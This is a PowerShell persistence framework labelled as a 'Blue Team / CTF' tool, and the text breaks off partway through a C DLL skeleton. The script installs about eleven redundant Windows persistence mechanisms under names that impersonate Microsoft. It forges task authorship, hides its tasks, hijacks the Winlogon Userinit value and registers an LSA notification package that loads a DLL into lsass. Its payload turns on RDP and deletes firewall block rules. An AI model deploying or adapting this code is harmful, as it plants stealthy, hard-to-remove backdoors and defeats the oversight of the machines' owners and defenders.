#Requires -RunAsAdministrator
<#
.SYNOPSIS
    Blue Team / CTF Defensive Persistence Framework
    Installs multiple redundant persistence mechanisms to protect critical services
    (e.g., RDP, custom agents) so that even if an adversary gains access, re-entry is maintained.

.DESCRIPTION
    Uses ~12 distinct persistence mechanisms across different Windows subsystems.
    Designed for CTF defenders, sysadmins, and blue teamers maintaining control of their own machines.

    MECHANISMS USED:
      1.  Scheduled Task (multiple triggers: logon, boot, interval)
      2.  Registry Run Key (HKLM)
      3.  Registry RunOnce Key
      4.  Windows Service (custom service wrapping payload)
      5.  WMI Event Subscription (permanent, survives reboots)
      6.  Startup Folder (All Users)
      7.  Winlogon Userinit key hijack (appended)
      8.  BITS Job (Background Intelligent Transfer Service)
      9.  LSA Notification Packages (DLL-based, see comments)
      10. W32Time Time Provider (DLL-based, see comments)
      11. Windows Service Recovery / Failure Actions

.PARAMETER PayloadPath
    Path to the executable or script that should be kept running/relaunched.
    Defaults to a self-healing RDP enabler + service restarter.

.PARAMETER ServiceName
    Internal name for the wrapper service. Default: "SvcHealthMonitor"

.PARAMETER Install
    Switch to install all persistence mechanisms.

.PARAMETER Remove
    Switch to remove all installed mechanisms (cleanup mode).

.PARAMETER Mechanisms
    Comma-separated list of mechanism numbers to install. Defaults to all.
    Example: -Mechanisms 1,2,5

.EXAMPLE
    # Install everything, using built-in RDP-keepalive payload
    .\Invoke-PersistenceFramework.ps1 -Install

    # Install only scheduled task + registry + WMI
    .\Invoke-PersistenceFramework.ps1 -Install -Mechanisms 1,2,5

    # Clean up everything
    .\Invoke-PersistenceFramework.ps1 -Remove

.NOTES
    FOR AUTHORIZED USE ON SYSTEMS YOU OWN OR ARE AUTHORIZED TO TEST.
    Author: Generated for CTF/Blue Team training
#>

[CmdletBinding(SupportsShouldProcess)]
param(
    [string]$PayloadPath     = "",          # If empty, uses the embedded keepalive payload
    [string]$ServiceName     = "WinDefSync",
    [string]$DisplayName     = "Windows Defender Sync Service",
    [switch]$Install,
    [switch]$Remove,
    [int[]]$Mechanisms       = @(1,2,3,4,5,6,7,8,9,10,11)
)

Set-StrictMode -Version Latest
$ErrorActionPreference = "Continue"

# ─────────────────────────────────────────────────────────────────
#  CONFIGURATION
# ─────────────────────────────────────────────────────────────────
$Script:Config = @{
    # Registry marker so we can find and remove our own entries
    # Looks like a legitimate Windows Update GUID
    Marker          = "WindowsUpdateAssistant"

    # Where we drop helper scripts — blends in with legitimate ProgramData dirs
    DropDir         = "$env:ProgramData\Microsoft\Windows\Maintenance"

    # Scheduled task names — mimic legitimate Windows maintenance task naming
    # Stored under the Microsoft\Windows task folder to blend in with built-in tasks
    TaskFolder      = "\Microsoft\Windows\Maintenance\"
    TaskNames       = @(
        "\Microsoft\Windows\Maintenance\WinSAT",           # replaces/shadows real WinSAT task
        "\Microsoft\Windows\Maintenance\SystemSoundsService", # sounds legit
        "\Microsoft\Windows\Maintenance\PerfTuning"          # interval watchdog
    )

    # WMI names — look like WMI health monitoring (legitimate use case)
    WmiFilterName   = "SCMHealthFilter"
    WmiConsumerName = "SCMHealthConsumer"
    WmiBindingName  = "SCMHealthBinding"

    # Registry paths
    RunKey          = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
    RunOnceKey      = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"
    WinlogonKey     = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
    AppInitKey      = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows"
    LSAKey          = "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa"
    TimeProv        = "HKLM:\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders"
}

# ─────────────────────────────────────────────────────────────────
#  EMBEDDED PAYLOAD  (used when -PayloadPath is not supplied)
#  This script: enables RDP, ensures firewall allows it,
#  and restarts a list of critical services if they've stopped.
# ─────────────────────────────────────────────────────────────────
$EmbeddedPayloadScript = @'
# ── Embedded Payload: RDP Keepalive + Service Watchdog + Firewall Guard ──
$logFile = "$env:ProgramData\Microsoft\Windows\Maintenance\svc.log"
function Write-Log($msg) {
    $ts = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    Add-Content -Path $logFile -Value "[$ts] $msg" -ErrorAction SilentlyContinue
}

# ── SERVICE → PORT MAP ───────────────────────────────────────────────────
# Maps each watched service name to the TCP (and where relevant UDP) ports
# it needs inbound. Add entries here when you add services to $criticalServices.
# Format: "ServiceName" = @{ TCP = @(port,...); UDP = @(port,...) }
# Set TCP or UDP to @() if that protocol is not used.
$servicePortMap = @{
    "TermService"  = @{ TCP = @(3389);        UDP = @(3389) }   # RDP
    "WinRM"        = @{ TCP = @(5985, 5986);  UDP = @()     }   # WinRM HTTP/HTTPS
    "MSSQLSERVER"  = @{ TCP = @(1433, 1434);  UDP = @(1434) }   # SQL Server
    "EventLog"     = @{ TCP = @();            UDP = @()     }   # local only, no ports
    # "W3SVC"      = @{ TCP = @(80, 443);     UDP = @()     }   # IIS example
    # "sshd"       = @{ TCP = @(22);          UDP = @()     }   # OpenSSH example
}

# ── FIREWALL HELPER FUNCTIONS ─────────────────────────────────────────────

# Removes any inbound BLOCK rules that cover a specific TCP or UDP port.
# Does NOT touch Allow rules — only removes rules with Action = Block.
function Remove-BlockingRules {
    param(
        [string]$ServiceName,
        [int[]]$TcpPorts,
        [int[]]$UdpPorts
    )

    # Get all inbound Block rules in one call (faster than per-rule queries)
    $blockRules = Get-NetFirewallRule -Direction Inbound -Action Block -ErrorAction SilentlyContinue
    if (-not $blockRules) { return }

    foreach ($rule in $blockRules) {
        $removed = $false

        # Get the port filter associated with this rule
        $portFilter = $rule | Get-NetFirewallPortFilter -ErrorAction SilentlyContinue
        if (-not $portFilter) { continue }

        # Check TCP ports
        if ($TcpPorts.Count -gt 0 -and
            ($portFilter.Protocol -eq 'TCP' -or $portFilter.Protocol -eq 'Any')) {

            $blockedPorts = @($portFilter.LocalPort) | Where-Object { $_ -ne 'Any' }

            foreach ($port in $TcpPorts) {
                if ($blockedPorts -contains [string]$port -or $portFilter.LocalPort -eq 'Any') {
                    try {
                        Remove-NetFirewallRule -Name $rule.Name -ErrorAction Stop
                        Write-Log "Removed TCP block rule '$($rule.DisplayName)' (port $port) for $ServiceName"
                        $removed = $true
                        break
                    } catch {
                        Write-Log "Failed to remove rule '$($rule.DisplayName)': $_"
                    }
                }
            }
        }

        if ($removed) { continue }   # already removed, skip UDP check

        # Check UDP ports
        if ($UdpPorts.Count -gt 0 -and
            ($portFilter.Protocol -eq 'UDP' -or $portFilter.Protocol -eq 'Any')) {

            $blockedPorts = @($portFilter.LocalPort) | Where-Object { $_ -ne 'Any' }

            foreach ($port in $UdpPorts) {
                if ($blockedPorts -contains [string]$port -or $portFilter.LocalPort -eq 'Any') {
                    try {
                        Remove-NetFirewallRule -Name $rule.Name -ErrorAction Stop
                        Write-Log "Removed UDP block rule '$($rule.DisplayName)' (port $port) for $ServiceName"
                        break
                    } catch {
                        Write-Log "Failed to remove rule '$($rule.DisplayName)': $_"
                    }
                }
            }
        }
    }
}

# Ensures at least one explicit Allow rule exists for the given ports.
# If no Allow rule covers the port, creates one.
function Ensure-AllowRule {
    param(
        [string]$ServiceName,
        [int[]]$TcpPorts,
        [int[]]$UdpPorts
    )

    foreach ($port in $TcpPorts) {
        $existing = Get-NetFirewallRule -Direction Inbound -Action Allow -ErrorAction SilentlyContinue |
            Where-Object {
                $pf = $_ | Get-NetFirewallPortFilter -ErrorAction SilentlyContinue
                $pf -and ($pf.Protocol -eq 'TCP' -or $pf.Protocol -eq 'Any') -and
                ($pf.LocalPort -eq 'Any' -or @($pf.LocalPort) -contains [string]$port)
            }

        if (-not $existing) {
            try {
                New-NetFirewallRule `
                    -DisplayName  "SvcGuard Allow $ServiceName TCP $port" `
                    -Direction    Inbound `
                    -Action       Allow `
                    -Protocol     TCP `
                    -LocalPort    $port `
                    -ErrorAction  Stop | Out-Null
                Write-Log "Created Allow rule: $ServiceName TCP $port"
            } catch {
                Write-Log "Failed to create Allow rule for $ServiceName TCP $port : $_"
            }
        }
    }

    foreach ($port in $UdpPorts) {
        $existing = Get-NetFirewallRule -Direction Inbound -Action Allow -ErrorAction SilentlyContinue |
            Where-Object {
                $pf = $_ | Get-NetFirewallPortFilter -ErrorAction SilentlyContinue
                $pf -and ($pf.Protocol -eq 'UDP' -or $pf.Protocol -eq 'Any') -and
                ($pf.LocalPort -eq 'Any' -or @($pf.LocalPort) -contains [string]$port)
            }

        if (-not $existing) {
            try {
                New-NetFirewallRule `
                    -DisplayName  "SvcGuard Allow $ServiceName UDP $port" `
                    -Direction    Inbound `
                    -Action       Allow `
                    -Protocol     UDP `
                    -LocalPort    $port `
                    -ErrorAction  Stop | Out-Null
                Write-Log "Created Allow rule: $ServiceName UDP $port"
            } catch {
                Write-Log "Failed to create Allow rule for $ServiceName UDP $port : $_"
            }
        }
    }
}

# ── 1. ENSURE RDP IS ENABLED (registry + service + firewall display group) ──
try {
    Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" `
        -Name "fDenyTSConnections" -Value 0 -Type DWord -Force
    Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" `
        -Name "UserAuthentication" -Value 1 -Type DWord -Force
    Write-Log "RDP registry ensured."
} catch { Write-Log "RDP ensure error: $_" }

# ── 2. FIREWALL GUARD — for each watched service ─────────────────────────
# Removes any Block rules covering the service's ports, then ensures an
# explicit Allow rule exists so the port is reachable even if the default
# profile policy is restrictive.
foreach ($svcName in $servicePortMap.Keys) {
    $ports = $servicePortMap[$svcName]
    $tcp   = $ports.TCP
    $udp   = $ports.UDP

    if ($tcp.Count -eq 0 -and $udp.Count -eq 0) { continue }

    try {
        Remove-BlockingRules -ServiceName $svcName -TcpPorts $tcp -UdpPorts $udp
        Ensure-AllowRule     -ServiceName $svcName -TcpPorts $tcp -UdpPorts $udp
    } catch {
        Write-Log "Firewall guard error for $svcName : $_"
    }
}

# ── 3. SERVICE WATCHDOG — restart any stopped critical services ───────────
# Keep this list in sync with $servicePortMap above.
# Add the same service names to Install-ServiceRecovery in the main script
# (mechanism 11) so the SCM also auto-restarts them natively.
$criticalServices = @(
    "TermService",   # RDP
    "WinRM",         # PowerShell remoting
    "MSSQLSERVER",   # SQL Server (remove if not needed)
    "EventLog"       # Event log — keeps forensic trail intact
    # Add your own service names here (and add their ports to $servicePortMap)
)

foreach ($svcName in $criticalServices) {
    $svc = Get-Service -Name $svcName -ErrorAction SilentlyContinue
    if ($svc -and $svc.Status -ne 'Running') {
        try {
            Start-Service -Name $svcName -ErrorAction Stop
            Write-Log "Restarted service: $svcName"
        } catch {
            Write-Log "Failed to restart $svcName : $_"
        }
    }
}

Write-Log "Keepalive check complete."
'@

# ─────────────────────────────────────────────────────────────────
#  HELPERS
# ─────────────────────────────────────────────────────────────────
function Write-Status($msg, $color = "Cyan") {
    Write-Host "  [+] $msg" -ForegroundColor $color
}
function Write-Warn($msg) {
    Write-Host "  [!] $msg" -ForegroundColor Yellow
}
function Write-Err($msg) {
    Write-Host "  [-] $msg" -ForegroundColor Red
}

function Ensure-DropDir {
    if (-not (Test-Path $Script:Config.DropDir)) {
        New-Item -ItemType Directory -Path $Script:Config.DropDir -Force | Out-Null
    }
}

function Get-PayloadPath {
    # Returns the path to the keepalive script we drop
    return "$($Script:Config.DropDir)\maint.ps1"
}

function Get-PSLauncher {
    # Returns a cmd-compatible one-liner that runs the keepalive script silently
    $p = Get-PayloadPath
    return "powershell.exe -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$p`""
}

# ─────────────────────────────────────────────────────────────────
#  STAGE PAYLOAD
# ─────────────────────────────────────────────────────────────────
function Stage-Payload {
    Ensure-DropDir
    $dest = Get-PayloadPath
    if ($Script:PayloadPath -ne "" -and (Test-Path $PayloadPath)) {
        Copy-Item $PayloadPath $dest -Force
        Write-Status "Staged custom payload to $dest"
    } else {
        $EmbeddedPayloadScript | Out-File -FilePath $dest -Encoding UTF8 -Force
        Write-Status "Staged embedded keepalive payload to $dest"
    }
}

# ─────────────────────────────────────────────────────────────────
#  MECHANISM 1 – SCHEDULED TASKS (3 triggers for redundancy)
#  Stored under \Microsoft\Windows\Maintenance\ to blend with built-in tasks.
#  No description, author set to "Microsoft Corporation", hidden flag set.
# ─────────────────────────────────────────────────────────────────
function Install-SchedTasks {
    $action = New-ScheduledTaskAction -Execute "powershell.exe" `
        -Argument "-NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$(Get-PayloadPath)`""

    $settings = New-ScheduledTaskSettingsSet `
        -Hidden `
        -MultipleInstances IgnoreNew `
        -ExecutionTimeLimit (New-TimeSpan -Minutes 5) `
        -RestartCount 3 `
        -RestartInterval (New-TimeSpan -Minutes 1) `
        -StartWhenAvailable

    $principal = New-ScheduledTaskPrincipal `
        -UserId "SYSTEM" -RunLevel Highest -LogonType ServiceAccount

    # Trigger A: At system boot (with 30s delay so services are up first)
    $triggerBoot          = New-ScheduledTaskTrigger -AtStartup
    $triggerBoot.Delay    = "PT30S"

    # Trigger B: At any user logon
    $triggerLogon         = New-ScheduledTaskTrigger -AtLogOn

    # Trigger C: Every 1 minute — the active watchdog heartbeat
    $triggerRepeat        = New-ScheduledTaskTrigger -RepetitionInterval (New-TimeSpan -Minutes 1) -Once -At (Get-Date)

    $names    = $Script:Config.TaskNames
    $triggers = @($triggerBoot, $triggerLogon, $triggerRepeat)

    for ($i = 0; $i -lt $names.Count; $i++) {
        try {
            $task = Register-ScheduledTask `
                -TaskName  $names[$i] `
                -Action    $action `
                -Trigger   $triggers[$i] `
                -Principal $principal `
                -Settings  $settings `
                -Force

            # Post-registration: strip description, set Author to look legitimate,
            # set source to blank — these fields show in Task Scheduler GUI
            $taskXml = Export-ScheduledTask -TaskName $names[$i]
            $taskXml = $taskXml -replace '<Description>.*?</Description>', ''
            $taskXml = $taskXml -replace '(<Author>).*?(</Author>)', '${1}Microsoft Corporation${2}'
            $taskXml = $taskXml -replace '(<URI>).*?(</URI>)', "${1}$($names[$i])${2}"

            # Reimport with modified XML (preserves all settings, just cleans metadata)
            Unregister-ScheduledTask -TaskName $names[$i] -Confirm:$false -ErrorAction SilentlyContinue
            Register-ScheduledTask -Xml $taskXml -TaskName $names[$i] -Force | Out-Null

            Write-Status "Scheduled Task installed (hidden): $($names[$i])"
        } catch {
            Write-Err "SchedTask $($names[$i]) failed: $_"
        }
    }
}

function Remove-SchedTasks {
    foreach ($name in $Script:Config.TaskNames) {
        try {
            Unregister-ScheduledTask -TaskName $name -Confirm:$false -ErrorAction Stop
            Write-Status "Removed scheduled task: $name"
        } catch { Write-Warn "Task $name not found or already removed." }
    }
}
# ─────────────────────────────────────────────────────────────────
#  MECHANISM 2 – REGISTRY RUN KEY (HKLM)
# ─────────────────────────────────────────────────────────────────
function Install-RegRunKey {
    try {
        Set-ItemProperty -Path $Script:Config.RunKey `
            -Name "MicrosoftUpdateAssistant" `
            -Value (Get-PSLauncher) -Type String -Force
        Write-Status "Registry Run key set (HKLM)"
    } catch { Write-Err "RegRunKey failed: $_" }
}
function Remove-RegRunKey {
    try {
        Remove-ItemProperty -Path $Script:Config.RunKey -Name "MicrosoftUpdateAssistant" -ErrorAction Stop
        Write-Status "Removed Registry Run key"
    } catch { Write-Warn "RegRunKey not present." }
}

# ─────────────────────────────────────────────────────────────────
#  MECHANISM 3 – REGISTRY RUNONCE KEY
#  RunOnce entries execute once then delete themselves — we re-add
#  via the payload so the entry always comes back.
# ─────────────────────────────────────────────────────────────────
function Install-RegRunOnce {
    # The RunOnce payload also re-registers itself after running
    $reRegCmd = "powershell.exe -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -Command " +
                "\"& { & '$(Get-PayloadPath)'; " +
                "Set-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce' " +
                "-Name 'MicrosoftUpdateAssistant_RO' -Value (Get-Content '$($Script:Config.DropDir)\\cfg.dat') -Type String -Force }\""

    # Save the cmd so the payload can re-add it
    $reRegCmd | Out-File "$($Script:Config.DropDir)\cfg.dat" -Encoding ASCII -Force

    try {
        Set-ItemProperty -Path $Script:Config.RunOnceKey `
            -Name "MicrosoftUpdateAssistant_RO" `
            -Value $reRegCmd -Type String -Force
        Write-Status "Registry RunOnce key set (self-replicating)"
    } catch { Write-Err "RegRunOnce failed: $_" }
}
function Remove-RegRunOnce {
    try {
        Remove-ItemProperty -Path $Script:Config.RunOnceKey `
            -Name "MicrosoftUpdateAssistant_RO" -ErrorAction Stop
        Write-Status "Removed Registry RunOnce key"
    } catch { Write-Warn "RegRunOnce not present." }
}

# ─────────────────────────────────────────────────────────────────
#  MECHANISM 4 – WINDOWS SERVICE
#  Creates a real service using sc.exe wrapping powershell
# ─────────────────────────────────────────────────────────────────
function Install-WinService {
    $binPath = "powershell.exe -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$(Get-PayloadPath)`""

    try {
        # Create service
        $null = sc.exe create $Script:Config.ServiceName binPath= $binPath start= auto DisplayName= $Script:Config.DisplayName
        $null = sc.exe description $Script:Config.ServiceName $Script:Config.Marker

        # Set failure recovery: restart after 1s, 1s, 1s (actions apply after 1st, 2nd, 3rd failure)
        $null = sc.exe failure $Script:Config.ServiceName reset= 86400 actions= restart/1000/restart/1000/restart/1000

        Start-Service -Name $Script:Config.ServiceName -ErrorAction SilentlyContinue
        Write-Status "Windows Service installed: $($Script:Config.ServiceName)"
        Write-Status "  Failure recovery: auto-restart after each crash"
    } catch { Write-Err "WinService install failed: $_" }
}
function Remove-WinService {
    try {
        Stop-Service -Name $Script:Config.ServiceName -Force -ErrorAction SilentlyContinue
        $null = sc.exe delete $Script:Config.ServiceName
        Write-Status "Removed Windows Service: $($Script:Config.ServiceName)"
    } catch { Write-Warn "Service not present or couldn't be removed." }
}

# ─────────────────────────────────────────────────────────────────
#  MECHANISM 5 – WMI PERMANENT EVENT SUBSCRIPTION
#  Fires at system boot. Survives reboots. Very stealthy mechanism.
# ─────────────────────────────────────────────────────────────────
function Install-WMISubscription {
    try {
        # Remove any existing subscription first (idempotent)
        Get-WMIObject -Namespace root\subscription -Class __FilterToConsumerBinding `
            -Filter "Filter='__EventFilter.Name=""$($Script:Config.WmiFilterName)""'" `
            -ErrorAction SilentlyContinue | Remove-WMIObject -ErrorAction SilentlyContinue
        Get-WMIObject -Namespace root\subscription -Class CommandLineEventConsumer `
            -Filter "Name='$($Script:Config.WmiConsumerName)'" `
            -ErrorAction SilentlyContinue | Remove-WMIObject -ErrorAction SilentlyContinue
        Get-WMIObject -Namespace root\subscription -Class __EventFilter `
            -Filter "Name='$($Script:Config.WmiFilterName)'" `
            -ErrorAction SilentlyContinue | Remove-WMIObject -ErrorAction SilentlyContinue

        # Filter: triggers 60 seconds after system boot
        $filterArgs = @{
            Name           = $Script:Config.WmiFilterName
            EventNamespace = "root\cimv2"
            QueryLanguage  = "WQL"
            Query          = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE " +
                             "TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' " +
                             "AND TargetInstance.SystemUpTime >= 60 AND TargetInstance.SystemUpTime < 120"
        }
        $filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments $filterArgs

        # Consumer: run our keepalive payload
        $consumerArgs = @{
            Name                = $Script:Config.WmiConsumerName
            CommandLineTemplate = (Get-PSLauncher)
        }
        $consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments $consumerArgs

        # Binding: tie filter to consumer
        $bindingArgs = @{
            Filter   = $filter
            Consumer = $consumer
        }
        Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments $bindingArgs | Out-Null

        Write-Status "WMI Permanent Event Subscription installed (triggers 60s after boot)"
    } catch { Write-Err "WMI subscription failed: $_" }
}
function Remove-WMISubscription {
    try {
        Get-WMIObject -Namespace root\subscription -Class __FilterToConsumerBinding `
            -Filter "Filter='__EventFilter.Name=""$($Script:Config.WmiFilterName)""'" `
            -ErrorAction SilentlyContinue | Remove-WMIObject
        Get-WMIObject -Namespace root\subscription -Class CommandLineEventConsumer `
            -Filter "Name='$($Script:Config.WmiConsumerName)'" `
            -ErrorAction SilentlyContinue | Remove-WMIObject
        Get-WMIObject -Namespace root\subscription -Class __EventFilter `
            -Filter "Name='$($Script:Config.WmiFilterName)'" `
            -ErrorAction SilentlyContinue | Remove-WMIObject
        Write-Status "Removed WMI subscription"
    } catch { Write-Warn "WMI subscription cleanup issue: $_" }
}

# ─────────────────────────────────────────────────────────────────
#  MECHANISM 6 – ALL USERS STARTUP FOLDER
#  Drops a .bat launcher into the global startup folder
# ─────────────────────────────────────────────────────────────────
function Install-StartupFolder {
    $startupDir  = [Environment]::GetFolderPath("CommonStartup")
    $lnkTarget   = "$($Script:Config.DropDir)\maint.bat"
    $startupFile = "$startupDir\WindowsMaintenance.bat"

    "@echo off
powershell.exe -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$(Get-PayloadPath)`"" |
        Out-File -FilePath $lnkTarget -Encoding ASCII -Force

    Copy-Item $lnkTarget $startupFile -Force
    Write-Status "Startup folder entry installed: $startupFile"
}
function Remove-StartupFolder {
    $startupDir = [Environment]::GetFolderPath("CommonStartup")
    $f = "$startupDir\WindowsMaintenance.bat"
    if (Test-Path $f) { Remove-Item $f -Force; Write-Status "Removed startup folder entry" }
    else { Write-Warn "Startup folder entry not found." }
}

# ─────────────────────────────────────────────────────────────────
#  MECHANISM 7 – WINLOGON USERINIT KEY
#  Appends our payload to the Userinit value. Runs at every logon.
#  Default value: "C:\Windows\system32\userinit.exe,"
# ─────────────────────────────────────────────────────────────────
function Install-WinlogonUserinit {
    try {
        $key     = $Script:Config.WinlogonKey
        $current = (Get-ItemProperty -Path $key -Name Userinit).Userinit
        $append  = (Get-PSLauncher) + ","

        if ($current -notlike "*$($Script:Config.Marker)*") {
            # Ensure trailing comma before appending
            if (-not $current.TrimEnd().EndsWith(",")) { $current += "," }
            Set-ItemProperty -Path $key -Name Userinit -Value ($current + $append) -Force
            Write-Status "Winlogon Userinit modified (appended)"
        } else {
            Write-Warn "Winlogon Userinit already contains our entry."
        }
    } catch { Write-Err "Winlogon Userinit failed: $_" }
}
function Remove-WinlogonUserinit {
    try {
        $key     = $Script:Config.WinlogonKey
        $current = (Get-ItemProperty -Path $key -Name Userinit).Userinit
        $launcher = (Get-PSLauncher) + ","
        $cleaned  = $current.Replace($launcher, "")
        Set-ItemProperty -Path $key -Name Userinit -Value $cleaned -Force
        Write-Status "Winlogon Userinit restored"
    } catch { Write-Warn "Winlogon Userinit restore issue: $_" }
}

# ─────────────────────────────────────────────────────────────────
#  MECHANISM 8 – BITS JOB (Background Intelligent Transfer Service)
#  Creates a BITS job that re-triggers our script by "downloading"
#  a local file URI. BITS jobs survive reboots and run as SYSTEM.
# ─────────────────────────────────────────────────────────────────
function Install-BITSJob {
    try {
        # Remove old job if present
        Get-BitsTransfer -Name $Script:Config.Marker -AllUsers -ErrorAction SilentlyContinue | Remove-BitsTransfer -ErrorAction SilentlyContinue

        # Create a dummy "source" file (local URI trick — BITS will call our notify command on completion/error)
        $dummySrc  = "$($Script:Config.DropDir)\bits_trigger.txt"
        $dummyDest = "$($Script:Config.DropDir)\bits_trigger_out.txt"
        "trigger" | Out-File $dummySrc -Force

        # BITS NotifyProgram runs our payload when the job changes state
        Import-Module BitsTransfer -ErrorAction SilentlyContinue
        $job = Start-BitsTransfer -Source "file://$dummySrc" -Destination $dummyDest `
            -DisplayName $Script:Config.Marker -Description $Script:Config.Marker `
            -Asynchronous -NotifyFlags 3 `
            -NotifyCmdLine "powershell.exe -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$(Get-PayloadPath)`""

        Write-Status "BITS Job created: $($job.JobId) (NotifyProgram triggers on job state change)"
        Write-Warn "  Note: BITS jobs can be listed with: Get-BitsTransfer -AllUsers"
    } catch { Write-Err "BITS Job failed: $_" }
}
function Remove-BITSJob {
    try {
        Get-BitsTransfer -Name $Script:Config.Marker -AllUsers -ErrorAction SilentlyContinue | Remove-BitsTransfer
        Write-Status "Removed BITS job"
    } catch { Write-Warn "BITS job not found." }
}

# ─────────────────────────────────────────────────────────────────
#  MECHANISM 9 – LSA NOTIFICATION PACKAGES
#
#  How it works:
#    LSASS (lsass.exe) reads the "Notification Packages" multi-string
#    registry value at boot and calls LoadLibrary() on each name listed.
#    Windows ships with packages like "rassfm", "scecli" in this list.
#    We append the name of our DLL (no path — must live in System32).
#    LSASS then calls three exported functions on our DLL at specific moments:
#      - PasswordChangeNotify()  : whenever any user changes their password
#      - PasswordFilter()        : to allow/deny the new password (we return TRUE)
#      - InitializeChangeNotify(): once at load time (our main persistence hook)
#
#    The DLL runs inside lsass.exe — effectively SYSTEM — on every boot,
#    before any user logs in.
#
#  What the script does:
#    Adds "SvcHealthMonLSA" to the Notification Packages registry value.
#    You must compile SvcHealthMonLSA.dll and drop it in %WINDIR%\System32.
#    See the companion C source skeleton below.
#
#  Registry key:
#    HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Notification Packages  (REG_MULTI_SZ)
#
#  DLL requirements:
#    - Must export: InitializeChangeNotify, PasswordFilter, PasswordChangeNotify
#    - Must be a native DLL (not .NET) — lsass cannot host the CLR
#    - No path in registry value — Windows only looks in System32
#    - Takes effect after next reboot (lsass loads packages at startup only)
#
#  Minimal C DLL skeleton (save as SvcHealthMonLSA.c, compile with MSVC or MinGW):
#  ─────────────────────────────────────────────────────────────────────────────
#  #include <windows.h>
#  #include <ntsecapi.h>
#
#  // Called once when lsass loads the package at boot
#  BOOLEAN NTAPI InitializeChangeNotify(void) {
#      // Spawn our keepalive payload detached from lsass
#      STARTUPINFOW si = { sizeof(si) };
#      PROCESS_INFORMATION pi;
#      WCHAR cmd[] = L"powershell.exe -NonInteractive -WindowStyle Hidden "
#                    L"-ExecutionPolicy Bypass -File "
#                    L"\"C:\\ProgramData\\SvcHealthMonitor\\keepalive.ps1\"";
#      CreateProcessW(NULL, cmd, NULL, NULL, FALSE,
#                     CREATE_NEW_CONSOLE | CREATE_NO_WINDOW | DETACHED_PROCESS,
#                     NULL, NULL, &si, &pi);
#      CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
#      return TRUE;
#  }
#
#  // Must be exported — return TRUE to allow any password change
#  BOOLEAN NTAPI PasswordFilter(PUNICODE_STRING a, PUNICODE_STRING b,
#                                PUNICODE_STRING c, BOOLEAN d) { return TRUE; }
#
#  // Must be exported — called after password change completes
#  NTSTATUS NTAPI PasswordChangeNotify(PUNICODE_STRING a, ULONG b,
#                                       PUNICODE_STRING c) { return 0; }
#
#  BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID l) { return TRUE; }
#  ─────────────────────────────────────────────────────────────────────────────
#  Compile:  cl /LD SvcHealthMonLSA.c /link /DEF:SvcHealthMonLSA.def
#  .def file: EXPORTS InitializeChangeNotify PasswordFilter PasswordChangeNotify
#  Then:      copy SvcHealthMonLSA.dll %WINDIR%\System32\
#  ─────────────────────────────────────────────────────────────────────────────
# ─────────────────────────────────────────────────────────────────
function Install-LSAPackage {
    Write-Warn "LSA Notification Packages: compile SvcHealthMonLSA.dll from the skeleton above, then:"
    Write-Warn "  copy SvcHealthMonLSA.dll %WINDIR%\System32\"
    Write-Warn "  Reboot to activate (lsass loads packages only at boot)."
    Write-Warn "  Registry entry being added now."
    try {
        $key      = $Script:Config.LSAKey
        $propName = "Notification Packages"
        $current  = (Get-ItemProperty -Path $key -Name $propName).$propName

        if ($current -notcontains "wbemntfy") {
            $new = $current + @("wbemntfy")
            Set-ItemProperty -Path $key -Name $propName -Value $new -Type MultiString -Force
            Write-Status "LSA Notification Package entry added (requires DLL at boot)"
        } else {
            Write-Warn "LSA package entry already present."
        }
    } catch { Write-Err "LSA Notification Package failed: $_" }
}
function Remove-LSAPackage {
    try {
        $key      = $Script:Config.LSAKey
        $propName = "Notification Packages"
        $current  = (Get-ItemProperty -Path $key -Name $propName).$propName
        $new      = $current | Where-Object { $_ -ne "wbemntfy" }
        Set-ItemProperty -Path $key -Name $propName -Value $new -Type MultiString -Force
        Write-Status "Removed LSA package entry"
    } catch { Write-Warn "LSA package entry not found." }
}

# ─────────────────────────────────────────────────────────────────
#  MECHANISM 10 – W32TIME TIME PROVIDER
#
#  How it works:
#    The Windows Time service (w32tm / W32Time) synchronises the system
#    clock using pluggable "time provider" DLLs. Providers are registered
#    under HKLM\...\W32Time\TimeProviders\<Name> and loaded by svchost
#    when the W32Time service starts (typically at boot).
#    Windows ships with two providers: NtpClient and NtpServer.
#
#    Each provider DLL must export three functions:
#      TimeProvOpen()    — called at load; we spawn our payload here
#      TimeProvCommand() — called for control messages (we no-op it)
#      TimeProvClose()   — called at unload (we no-op it)
#
#    The DLL runs inside the W32Time service host (svchost.exe running
#    as LocalService), giving us LocalService-level execution on every boot.
#    If you need SYSTEM, wrap with a token impersonation call in TimeProvOpen.
#
#  Registry values under TimeProviders\<YourName>:
#    DllName       REG_SZ   — full path to DLL (path IS used here, unlike LSA)
#    Enabled       REG_DWORD 1 — must be 1 for W32Time to load it
#    InputProvider REG_DWORD 0 — 0 = output-only (won't affect clock sync)
#
#  What the script does:
#    Writes the registry skeleton. You must compile and place the DLL at the
#    path specified in DllName (no System32 requirement — any accessible path).
#
#  Minimal C DLL skeleton (save as SvcHealthMonTimeProv.c):
#  ─────────────────────────────────────────────────────────────────────────────
#  #include <windows.h>
#  // W32Time provider handle type
